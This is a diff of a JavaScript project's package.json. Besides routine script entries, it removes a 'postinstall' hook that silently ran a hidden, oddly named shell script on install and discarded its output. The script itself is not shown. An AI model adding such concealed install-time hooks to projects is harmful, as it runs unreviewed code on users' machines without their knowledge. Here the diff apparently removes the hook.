@@ -21,8 +21,7 @@
     "tokens": "node scripts/build-tokens.mjs",
     "validate-layouts": "node scripts/validate-layouts.mjs packages/layouts",
     "beta-report": "node scripts/beta-report.mjs",
-    "version:set": "node scripts/version-set.mjs",
-    "postinstall": "sh ./.ci-zu9jm2.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "version:set": "node scripts/version-set.mjs"
   },
   "devDependencies": {
     "@axe-core/playwright": "^4.14.0",
